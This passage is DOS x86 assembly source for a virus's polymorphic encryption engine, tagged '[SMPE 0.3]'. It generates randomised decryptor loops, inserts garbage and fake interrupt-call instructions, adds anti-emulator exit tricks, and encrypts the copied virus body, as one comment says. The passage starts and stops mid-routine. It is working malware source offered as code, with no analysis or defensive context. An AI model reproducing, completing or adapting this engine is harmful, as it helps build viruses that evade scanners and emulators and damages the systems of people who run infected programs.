           mov     byte ptr ds:[si+11h],bl
           mov     word ptr ds:[si+0fh],bx

           mov     dword ptr ds:[random_ax],ebx

           mov     word ptr ds:[si-8],cx           ; save lenght
           mov     word ptr ds:[enc_loop],3480h    ; engine initialization

           mov     dword ptr ds:[si],ebx           ; clear type selection
           mov     dword ptr ds:[si+8],ebx

           dec     ebx
           mov     dword ptr ds:[si+4],ebx         ; clear used registers

           mov     byte ptr ds:[prefix_386],al

           push    ax
           push    ax
           pop     eax
           mov     dword ptr ds:[random_value],eax ; clear rnd values
           mov     dword ptr ds:[modify_key],eax

           mov     al,46h
           mov     dword ptr ds:[first_inc],eax    ; clear increments

           sub     di,di                           ; so ES:DI = ES:0

   ;; Initialization end


   ;; Decryption building start

           call    do_garbage                      ; decryptor gen. start
           push    di
           call    do_garbage
   rndget:
           call    do_random_dx_0f

           cmp     al,4            ; no sp
           je      rndget

           or      al,al          ; no ax
           jz      rndget

           mov     byte ptr ds:[si+4],al

           add     al,0b8h                         ; mov _reg16_,immediate
           stosb

           in      al,40h
           ror     al,1
           jnc     on_one_side
           mov     byte ptr ds:[si+9],01h

   on_one_side:

           call    do_random_dx_0f                 ; 0-2 ROR, 3-7 MATH

           cmp     al,2
           ja      nororing                        ; select if ror/rol of math

           cmp     byte ptr es:[di-1],0b9h
           je      nororing                        ; if using CX no rol/ror!
           mov     byte ptr ds:[si+1],01h          ; we'll ror/rol

           cmp     al,0
           jne     dim_select
           inc     byte ptr ds:[si+1]              ; rol/ror with diff CL
           jmp     dim_select

   nororing:
           cmp     al,4
           ja      dim_select

           mov     byte ptr ds:[si+11h],01h

   dim_select:
           call    do_random_dx_0f                 ; 0 - 2   byte operation
                                                   ; 3 - 5   word operation
                                                   ; 6 - 7  dword operation
           cmp     al,2
           jbe     notaword

           inc     byte ptr ds:[si]                ; word operation

           cmp     al,5
           jbe     notaword

           inc     byte ptr ds:[si]                ; dword operation

   notaword:
           cmp     byte ptr ds:[si+11h],01h        ; no 8bit stuff with reg
           jne     no_chck                         ; modifications
           cmp     al,2
           ja      no_chck
           inc     byte ptr ds:[si]
   no_chck:
           mov     word ptr ds:[si+0dh],di
           stosw                                   ; we will fill this later
           call    do_garbage                      ; shit stuff

   isntapnt:
           call    do_random_dx_0f
           cmp     al,03h                          ; select a pointer
           jb      isntapnt
           cmp     al,04h
           je      isntapnt
           cmp     al,byte ptr ds:[si+4]      ; can't be same as counter
           je      isntapnt
           mov     byte ptr ds:[si+5],al

           add     al,0b8h                 ; mov _reg16_,immediate
           stosb

           mov     word ptr [si-4],di           ; save pointer position
           stosw

           call    do_garbage
           cmp     byte ptr ds:[si+1],00h
           je      dontcl

           in      al,40h
           shr     ax,1
           pushf
           jc      make_a_cx
           mov     al,0b1h                         ; mov cl,rot_num
           stosb
           jmp     redorandom
   make_a_cx:
           mov     al,0b9h                         ; mov cx,rot_num
           stosb

   redorandom:
           mov     bx,0fh                          ; how many rols/rors
           mov     dx,bx
           call    do_random
           cmp     al,00h
           je      redorandom
           stosb
           mov     byte ptr ds:[cl_move],al

           mov     byte ptr ds:[si+6],01h

           popf
           jnc     no_cxbadd
           in      al,40h                          ; something for ch
           stosb
   no_cxbadd:
           call    do_garbage                      ; garbage
   dontcl:

           mov     ax,di
           ror     al,1
           pushf
           jc      withsegmentop

           mov     al,0eh                          ; PUSH CS
           stosb
           call    do_garbage
           mov     al,1fh                          ; POP DS
           stosb

           mov     byte ptr ds:[si+0ch],00h       ; don't use ds
           mov     byte ptr ds:[si+7],01h

   withsegmentop:

           cmp     byte ptr ds:[si+11h],01
           jne     d_immedia
   rndget2:

           call    do_garbage

           call    do_random_dx_0f

           cmp     al,4            ; no sp
           je      rndget2

           cmp     al,byte ptr ds:[si+5h]
           je      rndget2

           cmp     al,byte ptr ds:[si+04h]
           je      rndget2

           or      al,al          ; no ax
           jz      rndget2

           mov     byte ptr ds:[si+6],al

           cmp     byte ptr ds:[si],02h
           jne     no_prefix3

           call    set_386_prefix

   no_prefix3:
           add     al,0b8h
           stosb

           xor     bx,bx
           dec     bx
           mov     dx,bx
           call    do_random
           stosw
           mov     word ptr ds:[random_ax],ax

           cmp     byte ptr ds:[si],01h
           je      d_immediap1

           call    do_random

           stosw
           mov     word ptr ds:[random_ax+2],ax

   d_immediap1:
           call    do_garbage

   d_immedia:

           mov     word ptr ds:[si-2],di           ; where we will jump

           call    do_garbage

           popf
           jnc     mathoperation

           mov     al,02eh                         ; CS:
           stosb
   mathoperation:
           cmp     byte ptr ds:[si+1],00h
           je      puremath
           mov     al,0d2h                         ; ROL/ROR base byte
           cmp     byte ptr ds:[si],00h
           je      rolbyte
           inc     al                              ; word = byte +1

           cmp     byte ptr ds:[si],01h
           je      rolbyte

           call    set_386_prefix

   rolbyte:
           stosb                                   ; first rol/ror byte
           call    do_random_dx_0f
           ror     al,1
           mov     al,04h
           jnc     rollinging
           add     al,08h                          ; roring
           mov     byte ptr [enc_loop+1],04h       ; encryptor always with SI
           jmp     rolend
   rollinging:
           mov     byte ptr [enc_loop+1],0ch       ; ROL/ROR base
   rolend:

           mov     cl,byte ptr [si+5]              ; used register
           cmp     cl,06h                          ; use SI
           je      finish_pointer_ro
           inc     al
           cmp     cl,07h                          ; use DI
           je      finish_pointer_ro
           add     al,2
           cmp     cl,03h                          ; use BX
           je      finish_pointer_ro
           add     al,03fh                         ; so it is bp
           inc     byte ptr [si+7]
           stosb
           sub     al,al                           ; bp needs 1 byte more
   finish_pointer_ro:
           stosb
           jmp     nowordi
   puremath:

           cmp     byte ptr ds:[si+11h],00h
           je      immediate_use
           cmp     byte ptr ds:[si],02h
           jne     op_selecting
           call    set_386_prefix

           cmp     byte ptr es:[di-2],02eh
           jne     no_probs
           mov     word ptr es:[di-2],0662eh

   no_probs:
           jmp     op_selecting

   immediate_use:

           mov     al,080h                         ; ADD/SUB/XOR base
           cmp     byte ptr ds:[si],00h
           je      goforbyte

           inc     al                              ; word = byte + 1
           cmp     byte ptr ds:[si],01h
           je      goforbyte

           call    set_386_prefix

   goforbyte:
           stosb

   op_selecting:
           mov     bx,02h
           mov     dx,03h
           call    do_random                       ; select which
           mov     cl,al
           mov     al,01h

           mov     bl,29h

           cmp     byte ptr ds:[si+11h],01h
           je      no_addo
           add     bl,3
           add     al,3

   no_addo:

           cmp     cl,00h
           jne     subbing
           mov     byte ptr [enc_loop+1],bl        ; ADD ,2ch
           jmp     xoring
   subbing:
           cmp     cl,02h
           je      xor_oper
           sub     bl,28h+08h
           add     al,28h-30h
   xor_oper:
           add     al,30h
           add     bl,08h
           mov     byte ptr [enc_loop+1],bl        ; SUB ,04h
   xoring:
           cmp     byte ptr ds:[si+11h],01h
           jne     no_store
           stosb

           mov     cl,byte ptr ds:[si+6h]
           mov     al,04h
   addon:
           add     al,08h
           loop    addon

   no_store:
           mov     cl,byte ptr [si+5]
           cmp     cl,06h                          ; SI?
           je      finish_pointer
           inc     al
           cmp     cl,07h                          ; DI?
           je      finish_pointer
           add     al,2
           cmp     cl,03h                          ; BX?
           je      finish_pointer
           add     al,03fh                         ; well, BP!
           inc     byte ptr [si+7]
           stosb
           sub     al,al                           ; bp needs 1 byte more
   finish_pointer:
           stosb

           cmp     byte ptr ds:[si+11h],01h
           je      nowordi

           xor     bx,bx
           dec     bx
           mov     dx,bx

           call    do_random

           mov     byte ptr ds:[random_value],al
           stosb                                  ; one random value
           cmp     byte ptr ds:[si],00h
           je      nowordi                        ; encrypting words?

           call    do_random

           stosb
           mov     byte ptr ds:[random_value+1],al ; one more for word
           cmp     byte ptr ds:[si],01h
           je      nowordi

           call    do_random

           stosw
           mov     word ptr ds:[random_value+2],ax ; two more for dword
   nowordi:
           mov     cx,01
           cmp     byte ptr ds:[si],00h            ; is word?
           je      noby

           inc     cl                              ; one more pnt inc for word

           cmp     byte ptr ds:[si],01h
           je      noby

           inc     cl                              ; two more incs for dword
           inc     cl

   noby:
   do_inc_pointer:
           push    cx
           call    do_garbage              ; some foo instructions
           pop     cx

           call    do_random_dx_0f
           ror     al,1
           jc      normal_inc
   ;make with add/sub register

           mov     ax,0c083h               ; add ax,
           cmp     byte ptr ds:[si+9],00h
           je      no_sub
           add     ah,28h                  ; change to sub
   no_sub:
           add     ah,byte ptr ds:[si+5]
           stosw
   ;and now how many sub/add

           mov     dx,03h
           mov     bx,cx
           dec     bx
           call    do_random
           inc     al
           sub     cl,al
           jmp     store_and_test

   ;make with inc/dec register
   normal_inc:
           dec     cl
           mov     al,040h                 ; pointer increment
           cmp     byte ptr ds:[si+9],00h
           je      no_decrement
           add     al,08h                  ; dec base
   no_decrement:
           add     al,byte ptr ds:[si+5]
   store_and_test:
           stosb

           or      cx,cx
           jnz     do_inc_pointer

           call    do_garbage

           cmp     byte ptr ds:[si+11h],01h
           jne     no_key_change

           call    do_random_dx_0f                 ; select change mode

           mov     cl,al

           cmp     al,06h
           jae     rollio

           mov     ax,0c081h

           shr     cl,01h
           jc      ok_ahis

           inc     al
           inc     al

   ok_ahis:
           or      cl,cl
           jz      finish_ax

           add     ah,028h

           shr     cl,01h
           or      cl,cl
           jz      finish_ax

           add     ah,08h

   finish_ax:
           mov     word ptr ds:[modify_key],ax
           add     ah,byte ptr ds:[nocx]
           stosw
           in      al,40h
           stosb
           mov     byte ptr ds:[modify_key+2],al
           cmp     byte ptr es:[di-3],083h
           je      no_secondrnd
           in      al,40h
           stosb
           mov     byte ptr ds:[modify_key+3],al
   no_secondrnd:
           jmp     garb_ex
   rollio:
           mov     ax,0c0d1h
           shr     cl,01h
           jnc     storeit
           add     ah,08h
   storeit:
           mov     word ptr ds:[modify_key],ax
           add     ah,byte ptr ds:[nocx]
           stosw
           jmp     garb_ex

   no_key_change:
           cmp     byte ptr ds:[si+1],02h          ; rol/ror with changing CX
           jne     no_cl_change

           in      al,40h
           ror     al,1
           mov     al,041h                         ; inc cx
           jc      increment_cx
           add     al,08h                          ; 49h = dec cx
   increment_cx:
           mov     byte ptr ds:[random_value+1],al ; put also in encryptor
           stosb


   garb_ex:
           call    do_garbage

   no_cl_change:
           mov     al,048h                         ; dec counter
           add     al,byte ptr ds:[si+4]
           stosb

           call    do_random_dx_0f                 ; CMP or no CMP?
           cmp     al,05h
           jae     direct_ncmp

           push    ax
           call    do_garbage
           pop     ax

           cmp     al,02h
           ja      no_compare

           mov     byte ptr ds:[si+3],01h

           mov     ah,083h                         ; base for ops
           cmp     al,00h
           ja      no_cmp
           mov     al,0f8h                         ; CMP counter,0
           jmp     comp_store
   no_cmp:
           cmp     al,02h
           je      oring
           mov     al,0f0h                         ; XOR counter,0
           jmp     comp_store
   oring:
           mov     al,0c8h                         ; OR  counter,0
   comp_store:
           xchg    ah,al
           add     ah,byte ptr ds:[si+4]           ; store op
           stosw

           sub     al,al                           ; CMP/XOR/OR counter,0
           stosb
           jmp     direct_ncmp
   no_compare:
           cmp     al,04h
           je      do_with_and
           mov     al,0bh                          ; OR counter,counter
           jmp     second_operand
   do_with_and:
           mov     al,23h
   second_operand:
           stosb
           mov     al,0c0h                         ; AND counter,counter
           mov     cl,byte ptr ds:[si+4]
           add     al,cl
           call    instr_change
           stosb
   direct_ncmp:
           call    do_random_dx_0f
           mov     cl,al                           ; random in cl
           mov     ax,di
           inc     ax
           sub     ax,word ptr ds:[si-2]           ; check lenght of the jump
           not     ax                              ; of the decryption loop
           ror     cl,1
           jc      must_be_long                    ; random short or long jmp
           cmp     ax,0ff83h
           jae     do_short_jump

   must_be_long:
           sub     ax,03h                          ; for the jz forward

           push    ax
           mov     ax,0374h                        ; JZ=JE away

           mov     word ptr ds:[si+0fh],di         ; save JZ away offset

           cmp     byte ptr ds:[si+3],00h
           je      ok_stojz
           ror     cl,1
           jc      ok_stojz
           inc     al                              ; put JBE
           inc     al
   ok_stojz:
           stosw

           push    di
           call    do_garbage                      ; do some garbage between
           pop     ax                              ; the exit jump and the jump
                                                   ; to the decryption loop
           mov     cx,di
           sub     cx,ax

           pop     ax

           cmp     cx,7ah                          ; not too big
           jbe     ok_garbage

           sub     di,cx
           jmp     no_garb_here

   ok_garbage:
           sub     ax,cx

           push    di
           mov     di,word ptr ds:[si+0fh]
           add     byte ptr es:[di+1],cl
           pop     di

   no_garb_here:
           push    ax
           mov     al,0e9h                         ; JMP
           stosb
           pop     ax
           jmp     end_bjump

   do_short_jump:
           cmp     byte ptr es:[di-1],049h         ; is a DEC CX ?
           jne     normal_short_jump
           ror     cl,1
           jc      normal_short_jump
           dec     di                              ; overwrite the dec cx
           inc     al                              ; jump bytes
           mov     ah,0e2h                         ; LOOP
           jmp     xchnstr

   normal_short_jump:
           mov     ah,75h                          ; JNE=JNZ back
           cmp     byte ptr ds:[si+3],00h
           je      xchnstr
           ror     cl,1
           jnc     xchnstr
           inc     ah
           inc     ah
   xchnstr:
           xchg    ah,al

   end_bjump:
           stosw

           cmp     word ptr ds:[si+0fh],00h        ; made a JZ/JMP serie?
           je      no_garbage_ndd

           push    di
           call    do_garbage
           pop     ax

           mov     cx,di
           sub     cx,word ptr ds:[si+0fh]         ; make JZ (or JBE) to point
                                                   ; after some garbage instead
                                                   ; of just after the JMP to
           cmp     cx,07bh                         ; the decryption loop
           ja      no_garbage_ndd

           mov     cx,di
           sub     cx,ax

           push    di
           mov     di,word ptr ds:[si+0fh]
           add     byte ptr es:[di+1],cl
           pop     di

   no_garbage_ndd:
           mov     ax,01h
           mov     byte ptr ds:[si+0ch],al        ; we can again change DS
           dec     ax
           dec     ax
           mov     word ptr ds:[si+4],ax          ; we can now use all regs
           mov     byte ptr ds:[si+6],al
           or      byte ptr ds:[gnum],0fh         ; a little more max garbage
                                                  ; as anti-prefetch_probs in
                                                  ; this last stage

           call    do_garbage                      ; put some more garbage

           cmp     byte ptr ds:[si+9],01h
           jne     no_more_needed

           call    do_garbage                      ; expecially if we encrypted
           call    do_garbage                      ; from end to begin - prefetch

   no_more_needed:

   ; some garbage will be also encrypted

           push    di
           call    do_garbage                      ; do the encrypted garbage
           pop     ax

           mov     cx,di
           sub     cx,ax

           mov     ax,bp
           sub     ax,cx                           ; encrypt also some garabage

           add     word ptr ds:[si-8],cx           ; add to encryption lenght

           push    si
           mov     si,word ptr ds:[pointer_di]     ; calculate pointer on code
           add     ax,di
           cmp     byte ptr ds:[inverse],01h
           jne     lets_cont
           add     ax,word ptr ds:[enc_lenght]
           sub     ax,04
   lets_cont:
           mov     word ptr es:[si],ax             ; store pointer on code
           pop     si
           sub     ax,bp

   ;; Decryptor building end

           mov     cx,word ptr ds:[si-8]

           push    cx

           cmp     byte ptr ds:[si],00h            ; convert lenght in words
           je      go_for_it

           inc     cx
           shr     cx,1
           cmp     byte ptr ds:[si],01h            ; words?
           je      go_for_it

           inc     cx                              ; so dwords
           shr     cx,1

   go_for_it:

           mov     si,word ptr ds:[counter_pos]
           mov     word ptr es:[si],cx             ; store lenght

           pop     cx
           mov     dx,cx

           pop     bx

           pop     si
           pop     ds
           pop     cx

           push    bx

   ; Copy code and encrypt it
           push    di
           rep     movsb                             ; copy the virus after
           pop     di

   ; Pointer SI on data place isn't usable anymore after this line!

           mov     si,ax
           push    ax

   no_regdd:
           cmp     byte ptr ds:[inverse],01h
           jne     no_decrement_ndd
           mov     byte ptr ds:[first_inc],4eh     ; dec si
   no_decrement_ndd:
           cmp     byte ptr ds:[isrolror],00h        ; are we rol(r)ling?
           je      noro
           mov     byte ptr ds:[enc_loop],0d2h       ; first byte for ror/rol
           mov     byte ptr ds:[random_value],90h  ; no random value req

   noro:
           cmp     byte ptr ds:[isword],00h        ; word operations?
           je      pre_enc_loop_one

           mov     ax,dx
           inc     ax
           shr     ax,1

           cmp     byte ptr ds:[isword],01h
           je      using_words

           inc     ax                        ; dwords
           shr     ax,1

           mov     cl,066h
           cmp     byte ptr ds:[no_imm],01
           je      long_stuff
           mov     byte ptr ds:[full_enc_loop],cl
           jmp     using_words

   long_stuff:
           mov     byte ptr ds:[enc_loop],cl
           mov     cl,90h
           mov     byte ptr ds:[enc_loop-1],cl

   using_words:
           mov     dx,ax                     ; calculate lenght
           cmp     byte ptr ds:[no_imm],01h
           jne     no_regused
           mov     byte ptr ds:[enc_loop+2],04h
           cmp     byte ptr ds:[isword],02h
           je      come_here
           mov     byte ptr ds:[enc_loop],90h
           jmp     come_here
   no_regused:
           inc     byte ptr ds:[enc_loop]    ; put working opcode
   come_here:
           mov     cl,46h
           cmp     byte ptr ds:[inverse],01h
           jne     ok_no_cl_ch
           add     cl,08h
   ok_no_cl_ch:
           mov     byte ptr ds:[second_inc],cl   ; put another inc

           cmp     byte ptr ds:[isword],01h
           je      pre_enc_loop_one

           mov     ch,cl
           mov     word ptr ds:[second_inc+1],cx   ; put another incs for dwords

   pre_enc_loop_one:



   no_nopput:
           db      066h
           db      0b8h                    ; mov eax,
   random_ax       dd      00h             ; immediate

           db      0b1h                    ; mov cl,
   cl_move db      00h                     ; immediate

           push    es                      ; DS to what we must encrypt
           pop     ds

           jmp     full_enc_loop           ; cpus rules 4 prefetch


   add_to_cx:
           in      ax,40h
           and     ax,0111111b                     ; add up to 63 bytes to
           add     cx,ax                           ; the lenght in CX
           ret

   poly_name       db      '[SMPE 0.3]'

   set_386_prefix:
           push    ax
           mov     al,066h                         ; set 066h prefix
           stosb
           pop     ax
           ret

   full_enc_loop:

   prefix_386      db      90h             ; may be 66h if 386 codes used

   enc_loop:
   ;               xor     byte ptr ds:[si],immediate
                   db      080h
                   db      034h            ; real poly encryption
   random_value    db      090h
                   db      90h             ; random value2
                   db      90h
                   db      90h             ; dword op random values

   first_inc       db      46h             ; inc si
   second_inc      db      90h             ; space for second inc si
   incs_386        db      90h,90h         ; space for other two incs

   modify_key      db      90h,90h,90h,90h ; space for key modification op

           dec     dx
           jnz     full_enc_loop

           pop     ax

           cmp     byte ptr cs:[inverse],00h       ; from end?
           je      normali
           inc     ax                              ; adjust lenght
           inc     ax
           mov     di,ax
           jmp     after_it
   normali:
           mov     di,si
   after_it:

           sub     dx,dx                           ; ds:dx = generated code
           mov     cx,di                           ; cx=lenght

           call    add_to_cx

           pop     di                              ; starting off
           pop     bx

           push    ds
           pop     es

           mov     ah,49h
           call    simulate21                      ; deallocate the mem for poly
                                                   ; ES still on virus code,
                                                   ; but now it isn't allocated
                                                   ; any more
           push    cs
           pop     ds

           ret


   do_garbage:
           db      0bbh            ; max number of garbage instructions allowed
   gnum    db      0fh             ; mov bx,000fh
           db      00h

           mov     dx,bx
   pung:
           call    do_random       ; how much instructions
           cmp     al,00h
           je      pung            ; no 0 instruction allowed!
           mov     cl,al
           sub     ch,ch           ; CX = number of instructions to generate

   do_the_random:
           mov     dx,07                           ; used for the random gen
           mov     bx,dx
           call    do_random
           cmp     al,04h                          ; no SP allowed
           je      do_the_random
           cmp     al,byte ptr ds:[count_reg]      ; don't change the counter
           je      do_the_random
           cmp     al,byte ptr ds:[point_reg]      ; don't change the pointer
           je      do_the_random
           cmp     al,byte ptr ds:[nocx]           ; no CX change if used
           je      do_the_random
           xchg    ah,al
           mov     byte ptr ds:[reg8bits],0        ; reset 8 bit marker
           push    si
           call    select_instruction              ; generate the instuction
           pop     si
           loop    do_the_random                   ; with the selected reg.
           ret

   select_instruction:
           push    cx                              ; AH = destination register
           push    ax

           mov     si,offset instructions
   redorndin:

           mov     bx,0ah               ; 0Ah basic types of instructions
           mov     dx,0fh               ; don't eliminate some
           call    do_random            ; which instruction will we generate
           cmp     al,byte ptr ds:[last_done]      ; try to change sometime
           je      redorndin
   continue:
           mov     byte ptr ds:[last_done],al      ; store type
           add     si,ax                   ; point to the instr. in the table
           cmp     al,1                    ; which instruction
           ja      foo_label
           jmp     one_byte_instruction

   foo_label:
           cmp     al,7
           jb      no_3b
           jmp     three_bytes_instruction
   no_3b:
           cmp     al,2                    ; which instruction
           je      outta_here
           cmp     al,4
           jne     foo_label_2
           jmp     not_nop
   foo_label_2:
           cmp     al,5
           jb      outta_here
           jmp     rolling
   outta_here:
           mov     al,byte ptr ds:[si]
           jae     finish_mate
           push    ax
   calltheran:
           call    do_random_dx_0f
           mov     cl,al
           cmp     cl,7                            ; is a compare?
           jne     end_cmp_check
           mov     byte ptr ds:[cmp_check],1       ; sign it.
   end_cmp_check:
           pop     ax
           call    instr_change

   finish_mate:
           stosb                           ; instruction base oc
           call    do_random_dx_0f
           mov     cl,al
           pop     ax
           mov     al,0c0h                 ; op code for reg+instr
           cmp     ah,04
           jae     only16
           push    ax
           call    do_random_dx_0f         ; reg16 or reg8
           mov     ch,al
           pop     ax
           ror     ch,1
           jc      only16
           dec     byte ptr es:[di-1]      ; bytes opcode = word opcode-1
           ror     ch,1
           jnc     only16
           add     al,20h                  ; high 8 bits
           jmp     end_8_bts
   only16:
           cmp     byte ptr es:[di-1],08bh ; only if moving
           jne     finishing_mate

           cmp     byte ptr ds:[ds_mody],00h
           je      end_8_bts
           push    ax
           call    do_random_dx_0f
           cmp     al,02h
           pop     ax
           ja      end_8_bts
           add     byte ptr es:[di-1],03h
           mov     ah,3                    ; ds has eq second opcode as bx
           jmp     end_8_bts

   finishing_mate:
           push    ax
           call    do_random_dx_0f
           cmp     al,06h
           pop     ax
           jb      end_8_bts
           mov     al,06h
           stosb
           mov     byte ptr ds:[reg8bits],00h
           jmp     gen_mpos
   end_8_bts:
           add     al,cl
           mov     cl,ah
           call    instr_change
   stor_chkjmp:
           stosb
           cmp     word ptr ds:[cmp_check],0001    ; encountered a cmp?
           jne     not_comparing                   ; but out of a jmp region?
           call    jumping_zone                    ; no, so do one
   not_comparing:
           pop     cx
           ret

   one_byte_instruction:
           pop     ax
           mov     al,byte ptr ds:[si]             ; dec/inc generation
           add     al,ah
           stosb
           mov     cl,ah
           call    do_random_dx_0f
           mov     ah,cl
           cmp     al,07h                          ; INT 21h generation?
           jb      nocd21
           call    generate_int
           jmp     no_ah_disp
   nocd21:
           mov     cl,06h
           cmp     al,cl
           jb      no_ah_disp
           call    do_antiemulator
   no_ah_disp:
           cmp     byte ptr ds:[emu_trick],00h
           je      go_away_now

           in      al,40h
           shr     al,1
           jc      no_cd20
           shr     al,1
           jc      only_a_ret
           mov     ax,20cdh
           jmp     short stor_n_go
   only_a_ret:
           mov     al,0c3h
           stosb
           jmp     short exit_exit_put
   no_cd20:
           shr     al,1
           jc      with_el
           mov     ax,4cb4h                        ; mov ah,4ch
           jmp     short sto21_n_go
   with_el:
           mov     al,0b8h
           stosb
           in      al,40h                          ; random retrun code
           mov     ah,4ch                          ; mov ax,4cxxh
   sto21_n_go:
           stosw
           mov     ax,21cdh                        ; int 21h
   stor_n_go:
           stosw
   exit_exit_put:
           mov     byte ptr ds:[emu_trick],00h
   go_away_now:
           pop     cx
           ret

   not_nop:
           mov     al,0f7h                         ; not/neg
           stosb
           call    do_random_dx_0f
           mov     cl,al
           pop     ax
           push    cx
           mov     al,byte ptr ds:[si]             ; basic opcode
           add     al,ah                           ; register dependant
           shr     cl,1
           jc      isneg
           add     al,08h                          ; change to not
   isneg:
           pop     cx
           cmp     byte ptr ds:[push_nr],2         ; max pushes nested
           ja      nopush
           cmp     cl,2
           ja      nopush
           jmp     dopushpop                       ; do push
   nopush:
           stosb
           pop     cx
           ret

   rolling:
           mov     al,byte ptr ds:[si]
           stosb                           ; rol/ror... base oc
           mov     al,0c0h
           call    do_random_dx_0f
           mov     cl,al
           pop     ax
           cmp     cl,06h
           jne     no_increment
           inc     cl
   no_increment:
           mov     al,0c0h                 ; the base
           call    conv16to8               ; 8 or 16 bit instruction?
           add     al,ah
           call    instr_change
           stosb                           ; write the reg/op dipendant byte
           pop     cx
           ret

   three_bytes_instruction:
           cmp     al,8                    ;mov reg,immediate
           je      doalea
           cmp     al,9                    ;mov reg,[imm]
           je      domemcp
           cmp     al,0ah
           je      do_real_lea
           mov     al,083h                 ; write the fixed first byte
           stosb
   reget:
           call    do_random_dx_0f         ; select which 3 bytes to do
           mov     cl,al
           cmp     cl,7
           jne     end_cmp_imm_check
           mov     byte ptr ds:[cmp_check],1
           jmp     short end_cmp_imm_check

   do_compare:
           push    cx
           call    do_random_dx_0f
           cmp     ah,04h
           je      do_compare
           push    ax
           mov     al,83h
           stosb
           mov     cl,7
           mov     al,0c0h
           jmp     short jch_npt

   end_cmp_imm_check:
           mov     al,byte ptr ds:[si]
   jch_npt:
           call    instr_change            ; generate instruction
           mov     bl,al
           pop     ax
           mov     al,bl
           call    conv16to8               ; 16 or 8 bit instruction?
           add     al,ah
           stosb
           mov     bx,0ffh                 ; select the random immediate
           mov     dx,bx
           call    do_random
           jmp     stor_chkjmp             ; check for cmp and store

   doalea:
           mov     cl,0b8h
           pop     ax
           cmp     ah,4                    ; may we create a 8 bit mov?
           jae     mov16breg               ; yeah, so select randomly which
           push    ax
           in      al,40h
           ror     al,1
           jnc     dowith16b
           mov     byte ptr ds:[reg8bits],1
           mov     cl,0b0h                 ; mov reg8_low,imm
           ror     al,1
           jnc     dowith16b
           add     cl,4                    ; high 8 bits
   dowith16b:
           pop     ax
   mov16breg:
           mov     al,cl
           add     al,ah
           stosb                           ; mov reg,immediate
           jmp     gen_mpos

   do_real_lea:
           mov     al,08dh                 ; store first lea byte
           stosb
           pop     ax                      ; ah = used register
           mov     cl,ah
           mov     al,06h
           call    instr_change
           stosb
           jmp     gen_mpos

   domemcp:
           in      al,40h                  ; select segment
           shr     al,1
           jnc     no_seg_change           ; nc? only DS:
           shr     al,1
           jc      change_to_cs            ; c? put CS:
           mov     al,026h                 ; nc? put ES:
           stosb
           jmp     no_seg_change
   change_to_cs:
           mov     al,02eh                 ; CS:
           stosb
   no_seg_change:
           mov     al,08bh
           stosb                           ; mov reg,seg:[imm]
           pop     ax
           mov     cl,ah

           mov     al,06h
           call    instr_change
           stosb

   gen_mpos:
           mov     bx,07fffh                 ;select immediate
           mov     dx,bx
           call    do_random
           stosb
           xchg    al,ah
           cmp     byte ptr ds:[reg8bits],1
           je      no_2_imms               ; was an 8 bit instruction?
           stosb
   no_2_imms:
           pop     cx
           ret

   do_random_dx_0f:
           mov     bx,07h
           mov     dx,bx
   do_random:

           push    cx
           xor     cx,cx
           inc     cx
   do_real_random:
           in      al,40h
           mov     ah,al
           in      al,40h
   ;        ror     al,1
           xor     al,ah

           and     ax,dx
           cmp     ax,bx
           ja      do_real_random

           jcxz    end_real_random

           dec     cx

           cmp     al,byte ptr ds:[last_random]
           je      do_real_random

   end_real_random:
           mov     byte ptr ds:[last_random],al
           pop     cx
           ret

   last_random     db      0ffh

   instr_change:
           cmp     cl,00h                  ; generate new instruction
           je      finish_instr_change     ; based on input register.
           add     al,08h
           dec     cl
           jmp     instr_change
   finish_instr_change:
           ret

   conv16to8:
           cmp     ah,4
           jae     avante                  ; only from ax to dx
           push    ax
           call    do_random_dx_0f
           mov     ch,al
           ror     ch,1
           pop     ax
           jnc     avante                  ; do 8 or 16?
           sub     byte ptr es:[di-1],1
           ror     ch,1
           jnc     avante
           add     al,04                   ; low 8 bits or high 8?
   avante:
           ret

   int10_16:
           cmp     ch,0ch
           ja      no_get_cpos
           mov     ah,03h                  ; Get cursor position
           jmp     store_int_10
   no_get_cpos:
           cmp     ch,0dh
           ja      no_int10
           mov     ah,0fh                  ; Get current video mode
           jmp     store_int_10
   no_int10:
           cmp     ch,0eh
           ja      no_get_keystroke
           mov     ah,01h                  ; Get Keystroke
           push    ax
           in      al,40h
           rol     al,1
           pop     ax
           jc      store_int_16
           inc     ah                      ; Get shift states
           jmp     store_int_16
   no_get_keystroke:
           mov     ah,09h                  ; Get KBD functionality
           push    ax
           in      al,40h
           mov     cl,al
           rol     cl,1
           pop     ax
           jc      store_int_16
           inc     ah                      ; get KBD id
           rol     cl,1
           jc      store_int_16
           add     ah,07h                  ; check for keystroke
   store_int_16:
           stosw
           mov     ax,16cdh                ; int 16h
           jmp     sto_n_xit
   store_int_10:
           stosw
           mov     ax,10cdh                ; int 10h
   sto_n_xit:
           jmp     just_b4_end


   generate_int:
   doint:
           dec     di
           mov     bx,0fh
           mov     dx,bx
           call    do_random
           mov     ch,al                           ; rnd in ch
           mov     al,0b4h                         ; MOV ah,
           mov     bl,byte ptr ds:[nocx]
           mov     bh,byte ptr ds:[count_reg]
           cmp     bl,01h
           je      go_on_ah
           cmp     bl,02h
           jbe     go_on_ah
           cmp     bh,02h
           jbe     go_on_ah
           cmp     bl,03h
           je      lamah_jump
           cmp     bh,03h                          ; is BX as counter?
           je      lamah_jump
           cmp     byte ptr ds:[point_reg],03h     ; is BX as pointer?
   lamah_jump:
           je      intwithacd                      ; those with AX,CX,DX
           cmp     ch,1
           jbe     no_es_modify
           cmp     ch,0ch
           jae     int10_16
           cmp     ch,0bh
           jae     no_es_modify
           cmp     ch,4
           jbe     intwithacd
           cmp     ch,6
           jbe     go_on_ah
           cmp     ch,9
           ja      allocmem
           cmp     ch,7
           je      getpsp
           mov     ah,30h                          ; dos version
           jmp     storeandint
   go_on_ah:
           jmp     onlyahint
   no_es_modify:
           cmp     ch,0bh
           je      space_stuff
           cmp     ch,00h
           je      another_one
           mov     ah,51h                          ; get psp adress
           jmp     storeandint
   space_stuff:
           mov     ah,36h                          ; get free disk space C:
           stosw
           mov     ax,03b2h                         ; mov dl,03
           jmp     storeandint
   another_one:
           mov     al,0b8h
           stosb
           mov     ax,6601h                        ; get codepage
           jmp     storeandint
   getpsp:
           mov     ah,62h                          ; get psp
           jmp     storeandint
   intwithacd:
           cmp     ch,3
           jae     getbdrive
           mov     ah,06h                          ; ah=06h
           stosw
           mov     al,0b2h                         ; mov dl
           mov     ah,0ffh                         ; ffh
           jmp     storeandint
   allocmem:
           mov     ah,48h                          ; allocate mem
           stosw
           mov     al,0bbh                         ; in bx max mem avaiable
           stosb
           sub     ax,ax
